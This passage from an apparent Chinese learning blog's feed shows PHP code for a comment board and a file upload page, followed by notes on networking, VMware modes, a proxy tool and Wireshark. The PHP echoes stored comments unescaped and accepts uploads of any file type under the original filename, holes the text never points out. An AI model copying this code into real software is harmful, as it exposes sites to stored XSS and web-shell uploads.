invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查查询是否成功</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;最近的评论&lt;/h2&gt;&quot;</span>; <span class="comment">// 显示标题</span></span><br><span class="line">        <span class="comment">// 遍历结果集并显示每条评论</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$row[&#x27;comment&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>; <span class="comment">// 显示评论</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p style=&#x27;color: red;&#x27;&gt;获取评论时出错。&lt;/p&gt;&quot;</span>; <span class="comment">// 错误消息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>); <span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217090331480.png" alt="image-20231217090331480"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217090351311.png" alt="image-20231217090351311"></p><p>例如我们上面输入了.“a222222”，点击提交后，会上传至数据库中并读取数据库中数据并在下面显示。</p><h3 id="结合上面代码以及注释，可以知道代码如何处理信息的："><a href="#结合上面代码以及注释，可以知道代码如何处理信息的：" class="headerlink" title="结合上面代码以及注释，可以知道代码如何处理信息的："></a>结合上面代码以及注释，可以知道代码如何处理信息的：</h3><ol><li><strong>处理 POST 请求以提交评论</strong>:<ul><li>首先，代码检查是否有一个 POST 请求。这通常发生在用户提交了一个表单。</li><li>如果存在 POST 请求，代码检查是否存在一个名为 ‘comment’ 的字段，并且这个字段不为空。</li><li>如果满足这些条件，代码将连接到名为 ‘security’ 的数据库，使用 ‘root’ 用户名和密码。这是一个 MySQL 数据库连接。</li><li>设置字符集为 ‘utf8’，以确保正确处理字符。</li><li>接着，代码构造一个 SQL 插入语句，将用户的评论添加到 ‘comments’ 表中。</li><li>执行这个插入语句。如果成功，显示一条消息表示评论已经保存。如果失败，显示错误消息。</li><li>最后，关闭数据库连接。</li></ul></li><li><strong>显示最新的 20 条评论</strong>:<ul><li>再次建立与数据库的连接。</li><li>设置字符集为 ‘utf8’。</li><li>执行一个查询，选取 ‘comments’ 表中的最新 20 条评论（根据 ‘id’ 字段降序排列）。</li><li>如果查询成功，遍历结果集并显示每条评论。如果查询失败，显示错误消息。</li><li>最后，关闭数据库连接。</li></ul></li></ol><h2 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h2><h3 id="整体界面如下："><a href="#整体界面如下：" class="headerlink" title="整体界面如下："></a>整体界面如下：</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217093929309.png" alt="image-20231217093929309"></p><p>主要功能介绍：点击浏览按键后，可以打开资源管理器选择文件，点击提交后则会在本地文件夹中收到所上传文件，并且在下面展示。</p><h3 id="具体功能实现："><a href="#具体功能实现：" class="headerlink" title="具体功能实现："></a>具体功能实现：</h3><p>1.需要在根目录中建立一个文件夹uploads。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217094155808.png" alt="image-20231217094155808"></p><p>2.编写html代码以及php代码，代码以及注释如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出 HTML 表单</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;upload&quot;&gt;上传你的头像&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;file&quot; id=&quot;upload&quot; type=&quot;file&quot; &gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;submit&quot;  &gt;文件上传&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;下面是接收到的文件&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 HTTP 响应的内容类型和字符集</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否有文件被上传</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&quot;uploads&quot;</span>; <span class="comment">// 定义上传目录</span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]; <span class="comment">// 获取上传的文件名</span></span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]; <span class="comment">// 获取文件类型</span></span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]; <span class="comment">// 获取文件大小</span></span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]; <span class="comment">// 获取文件的临时存储路径</span></span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$upload_dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>; <span class="comment">// 设置上传后的目标路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试将文件从临时路径移动到目标路径</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$target_path</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 显示上传成功的消息</span></span><br><span class="line">        <span class="comment">// 显示文件信息</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$file_type</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$file_size</span> / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件存储的位置: &quot;</span> . <span class="variable">$target_path</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传失败&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 上传失败时的消息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示上传的图片</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;./<span class="subst">$target_path</span>.&#x27;&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最后上传效果如下："><a href="#最后上传效果如下：" class="headerlink" title="最后上传效果如下："></a>最后上传效果如下：</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217094440122.png" alt="image-20231217094440122"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php的网页制作&quot;&gt;&lt;a href=&quot;#php的网页制作&quot; class=&quot;headerlink&quot; title=&quot;php的网页制作&quot;&gt;&lt;/a&gt;php的网页制作&lt;/h1&gt;&lt;h2 id=&quot;评论区上传功能&quot;&gt;&lt;a href=&quot;#评论区上传功能&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>12.5（网络基础、代理、路由与交换机介绍，proxi以及wireshark的简单使用）</title>
    <link href="http://example.com/2023/12/09/12.5%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%A1%A5%E5%85%85%EF%BC%89/"/>
    <id>http://example.com/2023/12/09/12.5%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%A1%A5%E5%85%85%EF%BC%89/</id>
    <published>2023-12-09T09:27:36.332Z</published>
    <updated>2023-12-10T07:19:11.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络的基础知识（补充）"><a href="#网络的基础知识（补充）" class="headerlink" title="网络的基础知识（补充）"></a>网络的基础知识（补充）</h1><ol><li><strong>路由器</strong>：配备公网IP，负责网络数据的导航。<ul><li><strong>静态路由</strong>：预设固定路径，不会自动变更。</li><li><strong>动态路由</strong>：通过算法自动选择最优路径，确保数据传输效率。</li></ul></li><li><strong>IP地址</strong>：<ul><li><strong>静态IP</strong>：固定不变的网络地址，适合持久连接。</li><li><strong>动态IP（DHCP）</strong>：由服务器按需分配，有有效期限。一旦过期，IP地址会被回收，并在设备重启时重新分配。</li></ul></li></ol><p><strong>IP地址设置注意事项</strong>：</p><ul><li><strong>静态IP</strong>：配置后即固定，但若网络设置为动态分配，可能会暂时连接不上网络。</li><li><strong>动态IP</strong>：初始由DHCP自动分配。若将已分配的动态IP更改为静态，可能会导致无法接入网络。</li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231210145339848.png" alt="image-20231210145339848"></p><h1 id="代理的介绍"><a href="#代理的介绍" class="headerlink" title="代理的介绍"></a>代理的介绍</h1><h3 id="代理的概念（以clash的socks5协议为例）"><a href="#代理的概念（以clash的socks5协议为例）" class="headerlink" title="代理的概念（以clash的socks5协议为例）"></a>代理的概念（以clash的socks5协议为例）</h3><ol><li>概念：想象你的网络连接是一条从你的电脑到网站服务器的通道。**”代理软件”<strong>就像是在这条通道上设置一个中转站，而</strong>“socks5的节点”**是这个中转站的一种类型。这个中转站只处理某些类型的信息（传输层），比如邮件或网页请求，但它不处理更基础的网络连接信息（网络层），比如设备之间是如何连接的。</li><li>“TCP&#x2F;IP协议族”就像是互联网的通信规则集合。它包括很多不同的规则（协议），比如HTTP用于网页浏览，FTP用于文件传输，SMTP用于发送邮件。这些规则确保了我们可以在互联网上顺利地发送邮件、浏览网页和传输文件。</li></ol><h3 id="简单介绍osi七层协议（以qq为例）："><a href="#简单介绍osi七层协议（以qq为例）：" class="headerlink" title="简单介绍osi七层协议（以qq为例）："></a>简单介绍osi七层协议（以qq为例）：</h3><ol><li><strong>应用层</strong> - 这就像是QQ这类软件的表面，是你直接与之互动的部分。它负责把你的信息和操作转换成网络能理解的形式。</li><li><strong>表示层</strong> - 这一层的工作有点像翻译官。比如你发送的信息，需要以特定的格式（比如文字、图片）进行编码，让接收方能正确解读，有时还包括加密和解密，以确保信息安全。</li><li><strong>会话层</strong> - 想象一下QQ里的一个聊天窗口。这一层就像是保持这个聊天窗口开启和管理的部分，确保信息的交换是有序和同步的。</li><li><strong>传输层</strong> - 这层负责确保你的信息可靠地从一端传到另一端。就像是邮递员确保你的信件准时、完整地送达。</li><li><strong>网络层</strong> - 这层处理的是信息在整个互联网中的传递，包括找到从你的设备到朋友设备的最佳路径。它使用IP地址来识别不同的设备。</li><li><strong>数据链路层</strong> - 这层更关注于本地网络（比如你的家庭网络）内的信息传输。它处理物理地址（MAC地址）和检查传输过程中可能出现的错误。</li><li><strong>物理层</strong> - 这是最基础的层，处理的是物理连接，比如网线、无线信号。它确保数据以电信号或光信号的形式传输。</li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231210150400470.png" alt="image-20231210150400470"></p><h3 id="osi七层模型对应的网络协议"><a href="#osi七层模型对应的网络协议" class="headerlink" title="osi七层模型对应的网络协议"></a>osi七层模型对应的网络协议</h3><ol><li><h4 id="物理层（Physical-Layer）"><a href="#物理层（Physical-Layer）" class="headerlink" title="物理层（Physical Layer）"></a>物理层（Physical Layer）</h4></li></ol><ul><li><strong>协议</strong>: Ethernet, USB, Bluetooth, IEEE 802.11 (Wi-Fi), IEEE 802.3 (Ethernet 物理层), RJ45, V.35, V.24</li><li><strong>功能</strong>: 传输原始比特流，通过物理媒体（如电缆、光纤）。</li></ul><ol start="2"><li><h4 id="数据链路层（Data-Link-Layer）"><a href="#数据链路层（Data-Link-Layer）" class="headerlink" title="数据链路层（Data Link Layer）"></a>数据链路层（Data Link Layer）</h4></li></ol><ul><li><strong>协议</strong>: Ethernet, PPP (Point-to-Point Protocol), HDLC (High-Level Data Link Control), ARP (Address Resolution Protocol), MAC (Media Access Control)</li><li><strong>功能</strong>: 确保物理路径的无错误数据传输，MAC 地址寻址，帧同步等。</li></ul><ol start="3"><li><h4 id="网络层（Network-Layer）"><a href="#网络层（Network-Layer）" class="headerlink" title="网络层（Network Layer）"></a>网络层（Network Layer）</h4></li></ol><ul><li><strong>协议</strong>: IP (Internet Protocol), ICMP (Internet Control Message Protocol), IPSec (Internet Protocol Security), IGMP (Internet Group Management Protocol)</li><li><strong>功能</strong>: 路由和寻址，将数据包从源传输到目的地。</li></ul><ol start="4"><li><h4 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h4></li></ol><ul><li><strong>协议</strong>: TCP (Transmission Control Protocol), UDP (User Datagram Protocol), SSL&#x2F;TLS (Secure Sockets Layer &#x2F; Transport Layer Security)</li><li><strong>功能</strong>: 端到端的通信控制和服务质量保证。</li></ul><ol start="5"><li><h4 id="会话层（Session-Layer）"><a href="#会话层（Session-Layer）" class="headerlink" title="会话层（Session Layer）"></a>会话层（Session Layer）</h4></li></ol><ul><li><strong>协议</strong>: NetBIOS (Network Basic Input&#x2F;Output System), SMB (Server Message Block), RPC (Remote Procedure Call), NFS (Network File System)</li><li><strong>功能</strong>: 管理和控制应用程序之间的会话，建立、管理和终止会话。</li></ul><ol start="6"><li><h4 id="表示层（Presentation-Layer）"><a href="#表示层（Presentation-Layer）" class="headerlink" title="表示层（Presentation Layer）"></a>表示层（Presentation Layer）</h4></li></ol><ul><li><strong>协议</strong>: JPEG, GIF, TIFF (图像格式), ASCII, EBCDIC, Unicode (文本编码), SSL&#x2F;TLS, MPEG, QuickTime</li><li><strong>功能</strong>: 数据格式转换，数据加密和解密，数据压缩。</li></ul><ol start="7"><li><h4 id="应用层（Application-Layer）"><a href="#应用层（Application-Layer）" class="headerlink" title="应用层（Application Layer）"></a>应用层（Application Layer）</h4></li></ol><ul><li><strong>协议</strong>: HTTP (HyperText Transfer Protocol), FTP (File Transfer Protocol), SMTP (Simple Mail Transfer Protocol), DNS (Domain Name System), Telnet, SSH (Secure Shell), POP3&#x2F;IMAP (邮件接收), SNMP (Simple Network Management Protocol)</li><li><strong>功能</strong>: 为应用程序提供网络服务。</li></ul><h1 id="路由与交换机："><a href="#路由与交换机：" class="headerlink" title="路由与交换机："></a>路由与交换机：</h1><h2 id="基础概念与定义"><a href="#基础概念与定义" class="headerlink" title="基础概念与定义"></a>基础概念与定义</h2><p><strong>路由配置：</strong></p><ul><li><strong>静态路由</strong>：需要网络管理员手动设置路由表，指定网络包的传输路径。这种方法稳定但不够灵活，适用于网络结构不常变化的环境。</li><li><strong>动态路由</strong>：使用如OSPF（开放最短路径优先）这样的路由协议自动计算最优路径，并更新路由表。动态路由适应网络变化，维护成本相对较低。</li></ul><p><strong>路由表的内容</strong>： 路由表通常包含以下信息：</p><ul><li><strong>源IP&#x2F;MAC地址</strong>：发送数据包的设备的IP地址和物理地址。</li><li><strong>目的IP&#x2F;MAC地址</strong>：数据包要到达的目的设备的IP地址和物理地址。</li></ul><p><strong>交换机功能</strong>：</p><ul><li><strong>作为集线器使用</strong>：交换机可以连接多个设备，使它们在同一个网络内部通信。</li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231210151222574.png" alt="image-20231210151222574"></p><p><strong>通信障碍</strong>： 如上图中，PC1和PC2位于两个不同的网络段内，分别是192.168.2.0&#x2F;24和192.168.3.0&#x2F;24，由两台路由器分隔。通常情况下，PC1无法直接ping通PC2，因为两台路由器之间默认不会传递这些私有网络的路由信息。</p><ul><li><strong>问题</strong>：路由器的默认行为类似于防火墙，阻止了不同网络段的直接通信。</li><li><strong>解决方案</strong>：如图所示，如果在路由器1中<strong>手动配置静态路由，创建一条到路由器2的路径</strong>，并且两台路由器之间的路由协议能够互相学习和记录对方的IP和MAC地址，那么PC1就能成功ping通PC2，实现跨网络段的通信。</li></ul><p>通过这样的配置，尽管存在物理隔离，PC1和PC2之间的通信仍然可以通过路由器间设置的路由表来实现。这是网络管理员常用的方法来跨越不同子网进行通信。</p><h2 id="作者对于以上内容的理解："><a href="#作者对于以上内容的理解：" class="headerlink" title="作者对于以上内容的理解："></a>作者对于以上内容的理解：</h2><p>想象有两个人（PC1和PC2）分别住在两座由大门（路由器）守卫的城堡里。通常情况下，这两个大门是锁着的，所以两个人不能直接聊天（即电脑之间不能互相发送信息）。</p><ul><li><strong>静态路由</strong>：这就像是我们手动给守门人（路由器）一个通行证，告诉他，如果PC1想要和PC2聊天，应该走哪条路。这种方法很直接，但如果城堡很多，每次有新的城堡建立，我们都得再给守门人新的通行证，很麻烦。</li><li><strong>动态路由</strong>：这种情况下，守门人（路由器）很聪明，他们可以自己找出城堡之间最快的道路，并且如果发现更好的路线，他们会自己更新。这就像是有一个自动更新的GPS导航系统。</li></ul><p>现在，为了让PC1和PC2能够聊天，我们可以手动告诉第一个城堡的守门人（路由器1）如何找到第二个城堡（路由器2）。守门人记下了这条信息，并且把这个消息告诉了第二个城堡的守门人。这样，当PC1想要发信息给PC2时，第一个城堡的守门人就知道把信息传给第二个城堡的守门人，然后第二个城堡的守门人再把信息给到PC2。这样一来，尽管最初两个城堡是不允许直接通讯的，但通过我们的手动设置，两个人现在可以自由地聊天了。</p><p>这个过程就像是在两个相邻的社区之间修建了一条新路，即使原来的规则不允许居民直接访问对方的社区，现在他们可以通过这条新路互相拜访了。</p><h1 id="vmmare-workstation网络模式"><a href="#vmmare-workstation网络模式" class="headerlink" title="vmmare workstation网络模式"></a>vmmare workstation网络模式</h1><ol><li><h2 id="网络硬件："><a href="#网络硬件：" class="headerlink" title="网络硬件："></a><strong>网络硬件</strong>：</h2><ul><li><strong>WiFi模块</strong>：这个部分是你电脑上可以无线连接网络的组件。</li><li><strong>有线网卡</strong>：这是你插网线的地方，也就是电脑通过有线方式连接网络的接口。</li></ul></li><li><h2 id="驱动程序："><a href="#驱动程序：" class="headerlink" title="驱动程序："></a><strong>驱动程序</strong>：</h2><ul><li>如果这些硬件不工作，你可能需要到官网去找相应的驱动程序下载安装，这样才能确保硬件正常运行。</li></ul></li><li><h2 id="VMware网络模式："><a href="#VMware网络模式：" class="headerlink" title="VMware网络模式："></a><strong>VMware网络模式</strong>：</h2><ul><li><strong>桥接（Bridged）</strong>：虚拟机会像物理机一样，直接连接到网络，拥有独立的IP地址。在图中，PC1通过vm0连接WiFi模块，就是使用桥接模式，它可以访问外部网络，但与PC2和PC3在不同的网络环境中，所以它们之间不能直接通信。</li><li><strong>仅主机（Host-Only）</strong>：虚拟机只能与宿主机（也就是安装了VMware的那台电脑）通信，不能访问外部网络，这在图中没有展示。</li><li><strong>NAT（Network Address Translation）</strong>：虚拟机共享宿主机的IP地址上网，由宿主机的网络服务来分配私有IP地址并管理网络请求。在图中，PC2和PC3都设置为NAT模式，这意味着它们能够通过宿主机的NAT服务上网，它们能够相互通信，也能与PC1通信，但PC1无法直接访问PC2和PC3。</li></ul></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231210151901943.png" alt="image-20231210151901943"></p><ol start="4"><li><h2 id="对于以上作者自己的理解："><a href="#对于以上作者自己的理解：" class="headerlink" title="对于以上作者自己的理解："></a>对于以上作者自己的理解：</h2></li></ol><ul><li><p>想象电脑是一栋大房子（物理机），里面有几个小房间（虚拟机）。这些小房间里的居民（PC1，PC2，PC3）想要出去玩（连接到网络），他们有几种不同的出行方式（网络模式）：</p></li><li><p><strong>桥接模式（Bridged）</strong>：PC1有自己的小汽车（独立IP地址），可以自由出入大门（网络），去任何它想去的地方。但是，它不知道房子里其他房间的人（PC2和PC3）在哪里，因为它们用的是不同的门（NAT模式）。</p></li><li><p><strong>NAT模式（Network Address Translation）</strong>：PC2和PC3没有自己的车，但是他们可以坐宿主机的班车（共享宿主机IP）出去。他们之间可以在房子内部互相访问（因为在同一网络内），也可以通过班车和PC1在外面的地方见面（通过宿主机的网络连接外网），但PC1不能直接敲他们的房门（因为PC1不在NAT网络内）。</p></li></ul><p>总结一下：</p><ul><li><strong>PC1</strong>：它有自己的通行证（桥接模式），可以自由出入，但不了解宿主机内部的情况。</li><li><strong>PC2和PC3</strong>：它们拿的是内部通行证（NAT模式），可以在房子里自由走动，也可以一起坐班车出去，但他们不能单独开车（没有独立的外网IP地址）。</li></ul><h1 id="proxi的简单使用："><a href="#proxi的简单使用：" class="headerlink" title="proxi的简单使用："></a>proxi的简单使用：</h1><ol><li><h3 id="下载软件后以管理员启动，界面如下："><a href="#下载软件后以管理员启动，界面如下：" class="headerlink" title="下载软件后以管理员启动，界面如下："></a>下载软件后以管理员启动，界面如下：</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209161745054.png" alt="image-20231209161745054"></p><ol start="2"><li><h3 id="打开配置文件，点击”代理服务器“，再点击”添加“，按照如图设置点击确认即可。"><a href="#打开配置文件，点击”代理服务器“，再点击”添加“，按照如图设置点击确认即可。" class="headerlink" title="打开配置文件，点击”代理服务器“，再点击”添加“，按照如图设置点击确认即可。"></a>打开配置文件，点击”代理服务器“，再点击”添加“，按照如图设置点击确认即可。</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209161842399.png" alt="image-20231209161842399"></p><ol start="3"><li><h3 id="打开配置文件，打开代理规则，删除本地的规则，建立一个全新自己的规则。"><a href="#打开配置文件，打开代理规则，删除本地的规则，建立一个全新自己的规则。" class="headerlink" title="打开配置文件，打开代理规则，删除本地的规则，建立一个全新自己的规则。"></a>打开配置文件，打开代理规则，删除本地的规则，建立一个全新自己的规则。</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209162006429.png" alt="image-20231209162006429"></p><ol start="4"><li><h3 id="设置为之后代理规则的界面应该为，”default“动作应改为”Direct“，点击确认即可。"><a href="#设置为之后代理规则的界面应该为，”default“动作应改为”Direct“，点击确认即可。" class="headerlink" title="设置为之后代理规则的界面应该为，”default“动作应改为”Direct“，点击确认即可。"></a>设置为之后代理规则的界面应该为，”default“动作应改为”Direct“，点击确认即可。</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209162110623.png" alt="image-20231209162110623"></p><ol start="5"><li><h3 id="现在则进入测试"><a href="#现在则进入测试" class="headerlink" title="现在则进入测试"></a>现在则进入测试</h3></li></ol><p>打开终端，输入”ssh <a href="mailto:root@1.1.1.1">root@1.1.1.1</a>“，当如下图显示所示则为成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [root@1.1.1.1]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209163551696.png" alt="image-20231209163551696"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209163609059.png" alt="image-20231209163609059"></p><h2 id="wireshark抓包工具的使用"><a href="#wireshark抓包工具的使用" class="headerlink" title="wireshark抓包工具的使用"></a>wireshark抓包工具的使用</h2><blockquote><p>下载wireshark抓包工具，切记此版本目前只能在Windows10上面进行运行，当运行到windows11时会显示没有接口，需要进行更新，更新之后一样可以运行成功，因为winpcap版本太低也就是驱动程序版本太低导致无法识别win11的接口。</p></blockquote><ol><li><h3 id="双击打开wireshark，界面如图所示，并且选择自己所接互联网端口："><a href="#双击打开wireshark，界面如图所示，并且选择自己所接互联网端口：" class="headerlink" title="双击打开wireshark，界面如图所示，并且选择自己所接互联网端口："></a>双击打开wireshark，界面如图所示，并且选择自己所接互联网端口：</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209165656105.png" alt="image-20231209165656105"></p><ol start="2"><li><h3 id="找到自己当前物理机联网的形式"><a href="#找到自己当前物理机联网的形式" class="headerlink" title="找到自己当前物理机联网的形式"></a>找到自己当前物理机联网的形式</h3></li></ol><blockquote><p>比如WLAN，双击进入，可以输入http，tcp进行查看，这里展示tcp结果：</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209165718803.png" alt="image-20231209165718803"></p><ol start="3"><li><h3 id="启动终端，"><a href="#启动终端，" class="headerlink" title="启动终端，"></a>启动终端，</h3></li></ol><blockquote><p>输入”ping 192.168.2.45“</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209165745905.png" alt="image-20231209165745905"></p><ol start="4"><li><h3 id="停止抓包后，截取数据。"><a href="#停止抓包后，截取数据。" class="headerlink" title="停止抓包后，截取数据。"></a>停止抓包后，截取数据。</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209170106928.png" alt="image-20231209170106928"></p><ol start="5"><li><h3 id="通过查询ICMP报文类型可知，Type为8的包为回射请求（Ping请求）"><a href="#通过查询ICMP报文类型可知，Type为8的包为回射请求（Ping请求）" class="headerlink" title="通过查询ICMP报文类型可知，Type为8的包为回射请求（Ping请求）"></a>通过查询ICMP报文类型可知，Type为8的包为回射请求（Ping请求）</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209170239399.png" alt="image-20231209170239399"></p><ol start="6"><li><h3 id="通过查询ICMP报文类型可知，Type为0的包为回射应答（Ping应答）"><a href="#通过查询ICMP报文类型可知，Type为0的包为回射应答（Ping应答）" class="headerlink" title="通过查询ICMP报文类型可知，Type为0的包为回射应答（Ping应答）"></a>通过查询ICMP报文类型可知，Type为0的包为回射应答（Ping应答）</h3></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209170304172.png" alt="image-20231209170304172"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络的基础知识（补充）&quot;&gt;&lt;a href=&quot;#网络的基础知识（补充）&quot; class=&quot;headerlink&quot; title=&quot;网络的基础知识（补充）&quot;&gt;&lt;/a&gt;网络的基础知识（补充）&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;路由器&lt;/strong&gt;：配备公网IP，</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>python（更新，未完全掌握）</title>
    <link href="http://example.com/2023/12/06/python/"/>
    <id>http://example.com/2023/12/06/python/</id>
    <published>2023-12-06T13:54:35.911Z</published>
    <updated>2023-12-13T13:11:44.842Z</updated>
    
